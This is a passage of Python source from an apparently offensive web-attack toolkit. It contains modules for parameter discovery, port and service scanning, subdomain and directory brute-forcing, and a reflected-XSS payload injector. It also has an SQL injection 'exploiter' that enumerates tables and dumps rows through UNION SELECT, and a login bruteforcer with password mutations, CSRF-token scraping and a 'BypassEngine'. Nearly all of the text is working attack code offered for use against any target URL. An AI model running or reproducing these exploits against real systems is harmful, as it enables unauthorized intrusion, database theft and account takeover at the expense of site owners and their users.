                        print(f"      {D}PoC: {Y}{u}{N}")
                except Exception as e:
                    self.errors.append(f"{vname} crash: {e}")
        if self.vulns:
            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} exploitable vuln(s)!{N}")
            ptable(["#","TYPE","PARAM","RESULT"], [[str(i+1),v["type"],v["param"],v["extra"][:40]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
        else: print(f"\n\n  {G}✔{N} No vulns detected.")
        print(); return self.vulns


# ══════════════════════════════════════════════════════
#  PARAMSPIDER — URL & Parameter Discovery
# ══════════════════════════════════════════════════════

class ParamSpider:
    def __init__(self, domain, subs=False, threads=10):
        self.domain = domain.lower().replace("http://","").replace("https://","").split("/")[0]
        self.include_subs = subs
        self.threads = threads
        self.urls = set()
        self.params = {}
        self.all_urls = []

    def _fetch_wayback(self, domain):
        """Fetch URLs from Wayback Machine CDX API."""
        urls = set()
        try:
            url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original,timestamp&limit=10000&filter=statuscode:200"
            r = requests.get(url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200 and r.text.strip():
                data = r.json()
                for entry in data[1:]:
                    if len(entry) >= 1:
                        u = entry[0]
                        if self.include_subs or self.domain in u:
                            urls.add(u)
        except Exception as e:
            print(f"  {Y}⚠{N} Wayback error: {e}")
        return urls

    def _fetch_commoncrawl(self, domain):
        """Fetch URLs from CommonCrawl index."""
        urls = set()
        try:
            for cc in ["CC-MAIN-2024-10", "CC-MAIN-2024-18", "CC-MAIN-2024-26", "CC-MAIN-2024-38"]:
                url = f"http://index.commoncrawl.org/{cc}-index?url={domain}/*&output=json&limit=2000"
                r = requests.get(url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200 and r.text.strip():
                    for line in r.text.strip().split("\n"):
                        try:
                            entry = json.loads(line)
                            u = entry.get("url", "")
                            if u and (self.include_subs or self.domain in u):
                                urls.add(u)
                        except: continue
        except Exception as e:
            print(f"  {Y}⚠{N} CommonCrawl error: {e}")
        return urls

    def _extract_params(self, url):
        """Extract parameters from a URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        path = parsed.path
        for key in params:
            if key not in self.params:
                self.params[key] = set()
            self.params[key].add(url)

    def _filter_urls(self, urls):
        """Clean and deduplicate URLs."""
        clean = set()
        extensions = [".jpg", ".jpeg", ".png", ".gif", ".svg", ".css", ".js",
                      ".woff", ".woff2", ".ttf", ".eot", ".ico", ".mp4", ".mp3",
                      ".pdf", ".zip", ".tar", ".gz", ".exe", ".bin"]
        for u in urls:
            u = u.split("#")[0]  # remove fragments
            if not u or not u.startswith("http"):
                continue
            parsed = urlparse(u)
            if any(parsed.path.lower().endswith(ext) for ext in extensions):
                continue
            if parsed.query:  # only URLs with parameters
                clean.add(u)
        return clean

    def run(self):
        header("PARAMSPIDER — URL & PARAMETER DISCOVERY")
        print(f"  {C}◉{N} Domain  : {BOLD}{Y}{self.domain}{N}")
        print(f"  {C}◉{N} Sources : {B}Wayback Machine{N}, {B}CommonCrawl{N}")
        print(f"  {C}◉{N} Subs    : {'Yes' if self.include_subs else 'No (root only)'}{N}\n")

        # Fetch
        print(f"  {C}▶{N} Fetching URLs from Wayback Machine...")
        wb = self._fetch_wayback(self.domain)
        print(f"  {G}✔{N} Got {len(wb)} URLs from Wayback{N}")

        print(f"  {C}▶{N} Fetching URLs from CommonCrawl...")
        cc = self._fetch_commoncrawl(self.domain)
        print(f"  {G}✔{N} Got {len(cc)} URLs from CommonCrawl{N}")

        all_raw = wb | cc
        print(f"\n  {C}◉{N} Total raw URLs: {len(all_raw)}")

        # Filter
        filtered = self._filter_urls(all_raw)
        print(f"  {C}◉{N} URLs with params: {len(filtered)}")

        # Extract params
        self.all_urls = sorted(filtered)
        for u in self.all_urls:
            self._extract_params(u)

        # Display
        if self.all_urls:
            print(f"\n  {G}✔{N} {BOLD}Found {len(self.params)} unique parameter(s) in {len(self.all_urls)} URL(s)!{N}")
            print(f"\n  {BOLD}{C}PARAMETERS FOUND:{N}")
            print(f"  {D}{'─'*50}{N}")
            for i, (param, urls_list) in enumerate(sorted(self.params.items()), 1):
                sample = list(urls_list)[0][:90]
                print(f"  {G}{i:>3}.{N} {Y}{param:<25}{N} {D}{len(urls_list):>4} URLs{N}")
                print(f"      {D}→ {sample}...{N}")

            # Group by endpoint
            print(f"\n  {BOLD}{C}ENDPOINTS WITH PARAMETERS:{N}")
            print(f"  {D}{'─'*50}{N}")
            endpoints = {}
            for u in self.all_urls:
                parsed = urlparse(u)
                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if base not in endpoints:
                    endpoints[base] = set()
                for p in parse_qs(parsed.query):
                    endpoints[base].add(p)

            for i, (ep, params_set) in enumerate(sorted(endpoints.items()), 1):
                print(f"  {C}{i:>3}.{N} {ep}")
                print(f"      {D}params: {', '.join(sorted(params_set)[:8])}{N}")
                if len(params_set) > 8:
                    print(f"      {D}... and {len(params_set)-8} more{N}")

            # Save to file
            outfile = f"params_{self.domain}.txt"
            with open(outfile, "w") as f:
                for u in self.all_urls:
                    f.write(u + "\n")
            print(f"\n  {G}✔{N} Saved {len(self.all_urls)} URLs to {Y}{outfile}{N}")

            outfile2 = f"params_{self.domain}_uniq.txt"
            with open(outfile2, "w") as f:
                for p in sorted(self.params.keys()):
                    f.write(p + "\n")
            print(f"  {G}✔{N} Saved {len(self.params)} unique params to {Y}{outfile2}{N}")
        else:
            print(f"\n  {R}✘{N} No URLs with parameters found.")

        print(); return {"urls": self.all_urls, "params": self.params, "endpoints": endpoints if self.all_urls else {}}


# ══════════════════════════════════════════════════════
#  MODULES (PortScanner, ServiceDetector, XSS, SQLi, Subdomain, DNS, Whois, DirBust, LoginBf)
# ══════════════════════════════════════════════════════

class PortScanner:
    def __init__(self, target, ports="1-1024", timeout=1.0):
        self.target = target; self.timeout = timeout; self.open_ports = []; self.q = Queue()
        try: self.ip = socket.gethostbyname(target)
        except: self.ip = target
        self._parse(ports)
    def _parse(self, ports):
        self.pl = set()
        for p in ports.split(","):
            p = p.strip()
            if "-" in p: a, b = p.split("-"); self.pl.update(range(int(a),int(b)+1))
            else: self.pl.add(int(p))
        self.pl = sorted(self.pl)
    def _grab_banner(self, p):
        """Grab service banner from open port."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.ip, p))
            # Send common probe
            if p in (80, 443, 8080, 8443):
                s.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % self.target.encode())
            elif p == 21:
                pass  # Banner is sent on connect
            elif p == 22:
                pass
            elif p == 25:
                s.sendall(b"EHLO nusatool\r\n")
            banner = b""
            try:
                while True:
                    d = s.recv(256)
                    if not d: break
                    banner += d
                    if len(banner) > 1024: break
            except socket.timeout: pass
            s.close()
            text = banner.decode("utf-8", errors="replace").strip()[:100]
            return text if text else "no banner"
        except: return ""
    def _scan(self, p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(self.timeout)
            if s.connect_ex((self.ip, p)) == 0:
                try: sv = socket.getservbyport(p)
                except: sv = "?"
                banner = self._grab_banner(p)
                self.open_ports.append((p, sv, banner))
            s.close()
        except: pass
    def _worker(self):
        while not self.q.empty():
            self._scan(self.q.get()); self.q.task_done()
    def run(self):
        header("PORT SCANNER + BANNER GRAB")
        print(f"  {C}◉{N} Target: {W}{self.target}{N}  |  IP: {Y}{self.ip}{N}  |  Ports: {len(self.pl)}")
        for p in self.pl: self.q.put(p)
        for _ in range(min(100, len(self.pl))): threading.Thread(target=self._worker, daemon=True).start()
        self.q.join()
        if self.open_ports:
            print(f"\n  {G}✔{N} {BOLD}{len(self.open_ports)} open port(s)!{N}")
            ptable(["PORT","STATE","SERVICE","BANNER"], [[f"{p}/tcp",G+"open"+N,s,b[:40]] for p,s,b in self.open_ports])
        else: print(f"\n  {R}✘{N} No open ports.")
        print(f"  {D}{'─'*50}{N}\n"); return self.open_ports

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,993,995,1433,1521,
                2049,2082,2083,2096,2375,2376,3306,3389,4333,4444,4848,5000,5432,5900,
                5901,5984,6000,6379,7001,7070,7777,8000,8001,8080,8081,8443,8834,9000,
                9001,9042,9092,9100,9200,9300,9418,10000,11211,27017,50070]

class QuickScanner:
    def __init__(self, target):
        self.target = target
        self.ports = COMMON_PORTS
    def run(self):
        print(f"\n  {BOLD}{C}⚡ QUICK PORT SCAN{N}  —  {Y}{self.target}{N}")
        print(f"  {D}{'─'*40}{N}")
        scanner = PortScanner(self.target, ",".join(str(p) for p in self.ports), timeout=1.0)
        return scanner.run()

class ServiceDetector:
    def __init__(self, target, ports):
        self.target = target; self.results = []
        try: self.ip = socket.gethostbyname(target)
        except: self.ip = target
        self.pl = [int(p.strip()) for p in ports.split(",") if p.strip().isdigit()]
    def _grab(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3); s.connect((self.ip, port))
            probes = {80:b"HEAD / HTTP/1.0\r\n\r\n",443:b"HEAD / HTTP/1.0\r\n\r\n",
                      21:b"\r\n",22:b"\r\n",25:b"\r\n",110:b"\r\n",143:b"\r\n",8080:b"HEAD / HTTP/1.0\r\n\r\n"}
            s.send(probes.get(port,b"\r\n")); b = s.recv(1024).decode("utf-8",errors="ignore").strip(); s.close(); return b
        except: return None
    def run(self):
        header("SERVICE FINGERPRINT")
        print(f"  {C}◉{N} Target: {BOLD}{W}{self.target}{N}")
        for port in self.pl:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
                if s.connect_ex((self.ip, port)): s.close(); continue
                try: sv = socket.getservbyport(port)
                except: sv = "unknown"
                b = self._grab(port); self.results.append({"port":port,"service":sv,"banner":b}); s.close()
            except: continue
        if self.results:
            print(f"\n  {G}✔{N} {BOLD}{len(self.results)} service(s){N}")
            ptable(["PORT","SERVICE","BANNER"], [[str(r["port"]),r["service"],(r["banner"] or D+"No banner"+N)[:50]] for r in self.results])
        else: print(f"\n  {R}✘{N} No services.")
        print(); return self.results

class XSSScanner:
    def __init__(self, url, method="GET", param=None, bypass=None):
        self.url = url; self.method = method.upper(); self.param = param
        self.bypass = bypass or BypassEngine(url); self.vulns = []
        self.marker = lambda: f"NUSAXSS_{random.randint(10000,99999)}_PROOF"
        self.payloads = ["<script>alert('XSS')</script>","<script>confirm('XSS')</script>",
            "<img src=x onerror=alert('XSS')>","<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>","'><script>alert('XSS')</script>",
            "javascript:alert('XSS')","<ScRiPt>alert('XSS')</ScRiPt>"]
    def _get_params(self):
        p = parse_qs(urlparse(self.url).query); return list(p.keys()) if p else []
    def _req(self, param, payload):
        try:
            if self.method == "GET":
                new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
                u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
                r = self.bypass.get(u, timeout=10)
                return r, u
            else:
                r = self.bypass.post(self.url, data={param: payload}, timeout=10)
                return r, self.url
        except: return None, None
    def run(self):
        header("XSS EXPLOITER — PROOF OF CONCEPT")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
        params = [self.param] if self.param else self._get_params()
        if not params: print(f"  {R}✘{N} No params.\n"); return []
        print(f"  {C}◉{N} Params: {Y}{', '.join(params)}{N}")
        print(f"\n  {BOLD}{C}PHASE 1: INJECT & REFLECT CHECK{N}")
        for param in params:
            for payload in self.payloads:
                marker = self.marker()
                inject = payload.replace("alert('XSS')", f"alert('{marker}')")
                r, u = self._req(param, inject)
                if r is None: continue
                text = r.text or ""
                if marker.lower() in text.lower():
                    # Find exact reflection context
                    idx = text.lower().find(marker.lower())
                    start = max(0, idx - 60)
                    end = min(len(text), idx + len(marker) + 60)
                    context = text[start:end]
                    print(f"\n  {R}[!] XSS FOUND{N}  {Y}{param}{N}")
                    print(f"      {D}PoC URL: {Y}{u}{N}")
                    print(f"      {D}Payload: {Y}{inject}{N}")
                    print(f"      {D}Context: {N}")
                    print(f"      {W}{context.strip()}{N}")
                    self.vulns.append({"parameter": param, "payload": inject, "url": u, "context": context.strip()[:200]})
        if not self.vulns:
            print(f"\n  {Y}⚠{N} No reflected XSS detected.")
        print(f"\n  {BOLD}{C}PHASE 2: PoC GENERATION{N}")
        for v in self.vulns:
            print(f"\n  {C}─── PoC #{self.vulns.index(v)+1} ───{N}")
            print(f"  {W}<script>fetch('{v['url']}')</script>{N}")
            print(f"  {D}Or open in browser:{N}")
            print(f"  {Y}{v['url']}{N}")
        print(); return self.vulns

class SQLiScanner:
    def __init__(self, url, method="GET", param=None, bypass=None):
        self.url = url; self.method = method.upper(); self.param = param
        self.bypass = bypass or BypassEngine(url); self.vulns = []
        self.injectable_param = None; self.column_count = 0
        self.payloads = ["'","\"","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1",
            "1' AND '1'='1","1' AND '1'='2","' UNION SELECT NULL--","' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version--","' UNION SELECT database()--","' UNION SELECT user()--"]
        self.patterns = ["sql","syntax error","mysql","unclosed quotation","odbc","oracle","postgresql",
            "warning: mysql","invalid query","ora-","mysql_fetch","sqlite","you have an error in your sql"]
    def _get_params(self):
        p = parse_qs(urlparse(self.url).query); return list(p.keys()) if p else []
    def _req(self, param, payload):
        """Send request with payload in parameter."""
        try:
            if self.method == "GET":
                new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
                u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
                return self.bypass.get(u, timeout=10, allow_redirects=False)
            else:
                return self.bypass.post(self.url, data={param: payload}, timeout=10, allow_redirects=False)
        except: return None
    def _find_injection(self):
        """Find which parameter is injectable."""
        params = [self.param] if self.param else self._get_params()
        if not params: return None
        for param in params:
            for payload in ["'", "\"", "' OR '1'='1--", "1' AND '1'='1--"]:
                r = self._req(param, payload)
                if r is None: continue
                t = r.text.lower() if r.text else ""
                for p in self.patterns:
                    if p in t:
                        self.injectable_param = param
                        return param
                if r.status_code in (500, 404, 403):
                    self.injectable_param = param
                    return param
        return None
    def _find_column_count(self):
        """Use ORDER BY to find number of columns."""
        param = self.injectable_param
        if not param: return 0
        for cols in range(1, 21):
            r = self._req(param, f"' ORDER BY {cols}--")
            if r is None: continue
            if r.status_code in (500, 404, 403) or (r.text and "error" in r.text.lower()):
                self.column_count = cols - 1
                return cols - 1
            # If ORDER BY 1 succeeds but ORDER BY 2 also succeeds, keep going
        self.column_count = 1  # fallback
        return 1
    def _union_select(self, param, cols, select_expr):
        """Execute UNION SELECT and return the response text."""
        payload = f"' UNION SELECT {select_expr}--"
        r = self._req(param, payload)
        if r is None: return ""
        return r.text
    def _extract_data(self, select_expr):
        """Extract data via UNION SELECT."""
        param = self.injectable_param
        cols = self.column_count
        if not param or cols < 1: return []
        # Build padded SELECT with NULLs
        parts = select_expr.split(",") if "," in select_expr else [select_expr]
        if len(parts) < cols:
            parts = parts + ["NULL"] * (cols - len(parts))
        elif len(parts) > cols:
            parts = parts[:cols]
        expr = ",".join(parts)
        text = self._union_select(param, cols, expr)
        if not text: return []
        # Try to find data in the response HTML body
        body = text
        bm = re.search(r'<body[^>]*>(.*?)</body>', text, re.I | re.S)
        if bm: body = bm.group(1)
        # Strip HTML tags
        clean = re.sub(r'<[^>]+>', ' ', body)
        clean = re.sub(r'\s+', ' ', clean).strip()
        # Split by common delimiters used in UNION SELECT output
        parts_out = re.split(r'[,\s]+', clean)
        return [p for p in parts_out if p and len(p) < 200]
    def run(self):
        header("SQL INJECTION EXPLOITER")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
        params = [self.param] if self.param else self._get_params()
        if not params: print(f"  {R}✘{N} No parameters.\n"); return []
        print(f"  {C}◉{N} Parameters: {Y}{', '.join(params)}{N}")
        print(f"\n  {BOLD}{C}PHASE 1: DETECT INJECTION{N}")
        inj = self._find_injection()
        if not inj:
            print(f"  {R}✘{N} No SQL injection detected.\n")
            return []
        print(f"  {G}✔{N} Injectable parameter: {Y}{inj}{N}")
        print(f"\n  {BOLD}{C}PHASE 2: COLUMN COUNT{N}")
        cols = self._find_column_count()
        if cols < 1:
            print(f"  {Y}⚠{N} Could not determine column count, using 1.")
            cols = 1
        print(f"  {G}✔{N} Columns: {Y}{cols}{N}")
        print(f"\n  {BOLD}{C}PHASE 3: DATABASE FINGERPRINT{N}")
        for name, expr in [("Version", "@@version"), ("Database", "database()"), ("User", "user()")]:
            data = self._extract_data(expr)
            if data:
                print(f"  {G}•{N} {name}: {Y}{' '.join(data[:5])}{N}")
        print(f"\n  {BOLD}{C}PHASE 4: TABLE ENUMERATION{N}")
        # MySQL: list tables from information_schema
        tbl_expr = "group_concat(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()"
        data = self._extract_data(tbl_expr)
        tables = []
        if data:
            raw = " ".join(data)
            tables = [t.strip() for t in raw.replace("|", " ").split() if t.strip() and len(t.strip()) < 50]
            if tables:
                print(f"  {G}✔{N} Tables ({len(tables)}): {Y}{', '.join(tables[:15])}{N}")
                if len(tables) > 15:
                    print(f"      {D}... and {len(tables)-15} more{N}")
        if not tables:
            print(f"  {Y}⚠{N} Could not enumerate tables (may need manual exploitation).")
        print(f"\n  {BOLD}{C}PHASE 5: DATA EXTRACTION{N}")
        extracted = 0
        for table in tables[:5]:
            # Get columns for this table
            col_expr = f"group_concat(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_name='{table}'"
            col_data = self._extract_data(col_expr)
            cols_list = []
            if col_data:
                raw = " ".join(col_data)
                cols_list = [c.strip() for c in raw.replace("|", " ").split() if c.strip() and len(c.strip()) < 50]
            if not cols_list:
                cols_list = ["*"]
            # Dump first 3 rows
            sel_cols = ",".join(cols_list[:5]) if cols_list != ["*"] else "*"
            row_expr = f"group_concat({sel_cols} SEPARATOR '|') FROM {table} LIMIT 3"
            row_data = self._extract_data(row_expr)
            if row_data:
                raw = " ".join(row_data)
                rows_raw = raw.replace("|", " | ").split()
                rows = [r for r in rows_raw if r.strip() and len(r.strip()) < 200]
                if rows:
                    extracted += 1
                    print(f"  {G}•{N} {Y}{table}{N} ({len(cols_list)} cols, {len(rows)} vals): {D}{' '.join(cols_list[:5])}{N}")
                    print(f"      {Y}{' '.join(rows[:10])}{N}")
                    if len(rows) > 10:
                        print(f"      {D}... +{len(rows)-10} more{N}")
        if extracted == 0:
            print(f"  {Y}⚠{N} Could not extract data (UNION SELECT may not work on this target).")
        print()
        return self.vulns

class SubdomainEnumerator:
    def __init__(self, domain, wordlist=None, threads=20):
        self.domain = domain; self.threads = threads; self.subs = []; self.q = Queue()
        if wordlist and os.path.exists(wordlist): self.wl = wordlist
        else:
            d = os.path.join(os.path.dirname(__file__),"wordlists","subdomains.txt")
            self.wl = d if os.path.exists(d) else None
    def _check(self, sub):
        try:
            ip = socket.gethostbyname(f"{sub}.{self.domain}")
            self.subs.append((sub, f"{sub}.{self.domain}", ip))
        except: pass
    def _worker(self):
        while not self.q.empty():
            self._check(self.q.get()); self.q.task_done()
    def run(self):
        header("SUBDOMAIN ENUMERATOR")
        print(f"  {C}◉{N} Domain: {BOLD}{Y}{self.domain}{N}")
        if not self.wl:
            print(f"  {Y}⚠{N} No wordlist, using defaults")
            subs = "www mail ftp admin blog webmail dev api test vpn shop support app portal login cdn".split()
        else:
            with open(self.wl, errors="ignore") as f: subs = [l.strip() for l in f if l.strip()]
        print(f"  {C}◉{N} Checking {len(subs)} subdomains...\n")
        for s in subs: self.q.put(s)
        for _ in range(min(self.threads, len(subs))): threading.Thread(target=self._worker, daemon=True).start()
        self.q.join()
        if self.subs:
            print(f"  {G}✔{N} {BOLD}{len(self.subs)} subdomain(s)!{N}")
            ptable(["SUBDOMAIN","FULL DOMAIN","IP"], [[s,d,Y+ip+N] for s,d,ip in sorted(self.subs)])
        else: print(f"  {R}✘{N} No subdomains.")
        print(); return self.subs

class DNSRecon:
    def __init__(self, domain, record_type="ALL"):
        self.domain = domain; self.rt = record_type; self.results = {}
    def run(self):
        header("DNS RECON")
        print(f"  {C}◉{N} Domain: {Y}{self.domain}{N}")
        for r in (["A","AAAA","MX","NS"] if self.rt=="ALL" else [self.rt]):
            try:
                if r=="A": ip = socket.gethostbyname(self.domain); self.results["A (IPv4)"] = [ip]
                elif r=="AAAA":
                    try:
                        ips = [i[4][0] for i in socket.getaddrinfo(self.domain,None,socket.AF_INET6)]
                        if ips: self.results["AAAA (IPv6)"] = ips
                    except: pass
                elif r in ("MX","NS"):
                    _,_,ips = socket.gethostbyname_ex(self.domain)
                    if ips: self.results[f"{r} ({'Mail' if r=='MX' else 'Nameserver'})"] = ips
            except: continue
        if self.results:
            for k,v in self.results.items():
                print(f"  {C}▶{N} {BOLD}{k}{N}")
                for ip in v: print(f"    {D}└─{N} {Y}{ip}{N}")
        else: print(f"  {R}✘{N} No records.")
        print(); return self.results

class WhoisLookup:
    def __init__(self, domain):
        self.domain = domain
        self.servers = {"com":"whois.verisign-grs.com","net":"whois.verisign-grs.com","org":"whois.pir.org",
            "io":"whois.nic.io","co":"whois.nic.co","id":"whois.idnic.net","my":"whois.mynic.net","sg":"whois.sgnic.sg"}
    def run(self):
        header("WHOIS LOOKUP")
        tld = self.domain.split(".")[-1] if "." in self.domain else "com"
        srv = self.servers.get(tld, "whois.verisign-grs.com")
        print(f"  {C}◉{N} Domain: {Y}{self.domain}{N}  |  Server: {D}{srv}{N}\n")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(10); s.connect((srv,43))
            s.send(f"{self.domain}\r\n".encode()); data = b""
            while True:
                d = s.recv(4096)
                if not d: break
                data += d
            s.close()
            for line in data.decode("utf-8",errors="ignore").split("\n")[:60]:
                if line.strip(): print(f"  {D}│{N} {line}")
            print()
        except: print(f"  {R}✘{N} WHOIS failed.\n")

class DirBruteforcer:
    def __init__(self, url, wordlist, extensions=None, threads=10, bypass=None):
        self.base = url.rstrip("/"); self.wl = wordlist; self.threads = threads
        self.results = []; self.q = Queue()
        self.exts = extensions.split(",") if extensions else [""]
        self.bypass = bypass or BypassEngine(url)
        self.errors = 0
    def _check(self, path):
        for ext in self.exts:
            fp = path + (f".{ext}" if ext else "")
            u = urljoin(self.base+"/", fp)
            try:
                r = self.bypass.get(u, timeout=5, allow_redirects=False)
                if r.status_code in (200,201,204,301,302,307,401,403):
                    self.results.append({"url": u, "status": r.status_code, "size": len(r.content)})
                    sc = G if r.status_code==200 else (Y if r.status_code in (301,302) else M)
                    print(f"    {sc}[{r.status_code}]{N} {u}  {D}({len(r.content)}B){N}")
            except requests.RequestException:
                self.errors += 1
            except: self.errors += 1
    def _worker(self):
        while not self.q.empty():
            self._check(self.q.get()); self.q.task_done()
    def run(self):
        header("DIRECTORY ENUMERATOR")
        print(f"  {C}◉{N} URL: {Y}{self.base}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
            return []
        try:
            with open(self.wl, errors="ignore") as f: paths = [l.strip() for l in f if l.strip()]
        except: print(f"  {R}✘{N} Wordlist not found.\n"); return []
        print(f"  {C}◉{N} Paths: {len(paths)} | Threads: {self.threads}\n")
        for p in paths: self.q.put(p)
        for _ in range(min(self.threads, len(paths))): threading.Thread(target=self._worker, daemon=True).start()
        self.q.join()
        if self.results: print(f"\n  {G}✔{N} {BOLD}{len(self.results)} path(s)!{N}")
        else: print(f"\n  {R}✘{N} No paths.")
        if self.errors:
            print(f"  {D}({self.errors} request(s) failed){N}")
        print(); return self.results

class LoginBruteforcer:
    def __init__(self, url, usernames_file, passwords_file,
                 user_f="username", pass_f="password",
                 fail_s="incorrect", method="POST",
                 threads=1, delay=0, mode="form",
                 csrf_token=None, csrf_field=None,
                 proxy=None, bypass=None):
        self.url = url
        self.uf = usernames_file
        self.pf = passwords_file
        self.ufield = user_f
        self.pfield = pass_f
        self.fail = fail_s
        self.method = method.upper()
        self.threads = min(threads, 50)
        self.delay = delay
        self.mode = mode
        self.csrf_token = csrf_token
        self.csrf_field = csrf_field or "csrf_token"
        self.proxy = proxy
        self.creds = []
        self.lock = threading.Lock()
        self.done = 0
        self.total = 0
        self.start_time = None
        self.bypass = bypass or BypassEngine(url)
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _extract_csrf(self, html):
        patterns = [
            r'name=["\']csrf[_]?token["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']_csrf["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
            r'csrf-token["\']?\s*content=["\']([^"\']+)',
            r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']([^"\']+)',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.I)
            if m:
                return m.group(1)
        return None

    def _mutate(self, password):
        """Generate password mutations."""
        yield password  # Original
        yield password.capitalize()
        yield password.upper()
        yield password.lower()
        yield password + "!"
        yield password + "123"
        yield password + "123!"
        yield password + "@"
        yield password + "2024"
        yield password + "2025"
        yield password + "2026"
        yield password[0].upper() + password[1:] if len(password) > 1 else password
        # Leet speak substitutions
        leet = str(password)
        for a, b in [("a","@"),("a","4"),("e","3"),("i","1"),("o","0"),("s","$"),("s","5"),("t","7")]:
            if a in leet:
                yield leet.replace(a, b)

    def _try(self, u, p):
        for attempt_pwd in set(self._mutate(p)):
            try:
                data = {}
                hdrs = {"User-Agent": random.choice(self.bypass.ua_list)} if hasattr(self.bypass, 'ua_list') else {}
                if self.mode == "json":
                    data = {self.ufield: u, self.pfield: attempt_pwd}
                    if self.csrf_token: data[self.csrf_field] = self.csrf_token
                    r = self.session.post(self.url, json=data, headers=hdrs, timeout=10, allow_redirects=False)
                elif self.mode == "basic":
                    r = self.session.get(self.url, auth=(u, attempt_pwd), headers=hdrs, timeout=10, allow_redirects=False)
                elif self.mode == "bearer":
                    hdrs["Authorization"] = f"Bearer {attempt_pwd}"
                    r = self.session.get(self.url, headers=hdrs, timeout=10, allow_redirects=False)
                else:
                    csrf = self.csrf_token
                    if not csrf and self.method == "POST":
                        try:
                            gr = self.session.get(self.url, timeout=8)
                            csrf = self._extract_csrf(gr.text)
                        except: pass
                    data[self.ufield] = u
                    data[self.pfield] = attempt_pwd
                    if csrf: data[self.csrf_field] = csrf
                    if self.method == "POST":
                        r = self.session.post(self.url, data=data, headers=hdrs, timeout=10, allow_redirects=False)
                    else:
                        r = self.session.get(self.url, params=data, headers=hdrs, timeout=10, allow_redirects=False)

                # Success detection
                text = r.text.lower()
                # Redirect away from login → success
                if r.status_code in (301, 302, 307, 308):
                    loc = r.headers.get("Location", "").lower()
                    if "login" not in loc:
                        self.creds.append({"username": u, "password": attempt_pwd})
                        return True
                # JSON response with success
                if r.text.strip().startswith("{"):
                    try:
                        j = json.loads(r.text)
                        if j.get("status") == "success":
                            self.creds.append({"username": u, "password": attempt_pwd})
                            return True
                    except: pass
                # Keyword-based detection
                fail_keywords = [self.fail.lower()] if self.fail else []
                fail_keywords += ["invalid", "wrong", "failed", "error", "incorrect", "not found"]
                success_keywords = ["welcome", "dashboard", "logout", "success", "selamat datang"]
                has_fail = any(kw in text for kw in fail_keywords if kw)
                has_success = any(kw in text for kw in success_keywords)
                if has_success and not has_fail:
                    self.creds.append({"username": u, "password": attempt_pwd})
                    return True
                # Custom fail string not found + status != 401/403
                if self.fail and self.fail.lower() not in text and r.status_code not in (401, 403):
                    self.creds.append({"username": u, "password": attempt_pwd})
                    return True
                return False
            except: continue
        return False

    def _worker(self, q):
        while True:
            try:
                u, p = q.get_nowait()
            except:
                break
            if self._try(u, p):
                with self.lock:
                    # _try already added to creds, just print the last found
                    last = self.creds[-1] if self.creds else None
                    if last:
                        print(f"\n  {G}{BOLD}[SUCCESS]{N} {Y}{last['username']}{N} : {Y}{last['password']}{N}")
            with self.lock:
                self.done += 1
                if self.done % max(1, self.total // 100) == 0 or self.done == self.total:
                    elapsed = time.time() - self.start_time
                    rate = self.done / elapsed if elapsed > 0 else 0
                    eta = (self.total - self.done) / rate if rate > 0 else 0
                    pct = self.done * 100 // self.total
                    print(f"  {D}[{self.done}/{self.total}] {pct}% | {rate:.1f}/s | ETA {eta:.0f}s{N}", end="\r")
            if self.delay > 0:
                time.sleep(self.delay)
            q.task_done()

    def run(self):
        header("LOGIN BRUTEFORCER")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {C}◉{N} Mode: {Y}{self.mode.upper()}{N} | Method: {Y}{self.method}{N} | Threads: {Y}{self.threads}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.proxy:
            print(f"  {C}◉{N} Proxy: {Y}{self.proxy}{N}")

        try:
            with open(self.uf, errors="ignore") as f: users = [l.strip() for l in f if l.strip()]
        except: print(f"  {R}✘{N} Users file not found.\n"); return []
        try:
            with open(self.pf, errors="ignore") as f: passes = [l.strip() for l in f if l.strip()]
        except: print(f"  {R}✘{N} Pass file not found.\n"); return []

